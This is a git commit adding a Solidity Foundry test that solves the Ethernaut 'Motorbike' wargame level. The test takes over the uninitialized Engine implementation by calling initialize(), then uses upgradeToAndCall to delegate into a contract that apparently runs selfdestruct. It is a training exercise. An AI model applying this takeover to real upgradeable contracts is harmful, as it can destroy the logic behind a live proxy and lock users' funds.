1011fa3f85c438b1154d5bf13ce70ab336272c69
Nguyen Le Quang <quangkeu95@gmail.com>
2023-07-07 17:32:52 +0700

    Submit level Motorbike

---
+++ test/Motorbike/Motorbike.t.sol
@@ -0,0 +1,34 @@
+pragma solidity >=0.8.19;
+
+import { Test } from "forge-std/Test.sol";
+import { Motorbike, Engine, BikeExy } from "src/Motorbike/Motorbike.sol";
+import { Ethernaut } from "src/Ethernaut.sol";
+import "forge-std/console2.sol";
+
+contract MotorbikeTest is Test {
+    Ethernaut ethernaut;
+    address me = makeAddr("me");
+
+    function setUp() external {
+        ethernaut = new Ethernaut();
+    }
+
+    function testMotorbikeHack() external {
+        // level setup
+        Engine engine = new Engine();
+        Motorbike motorbike = new Motorbike(address(engine));
+        BikeExy bikeExy = new BikeExy();
+
+        // the goal 
+        engine.initialize();
+
+
+        // Get data required for the upgrade to and call method
+        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
+
+        // upgrade to and call will delegate call to bikeExy which will run selfdestruct
+        engine.upgradeToAndCall(address(bikeExy), initEncoded);        
+        
+        // level check
+    }
+}
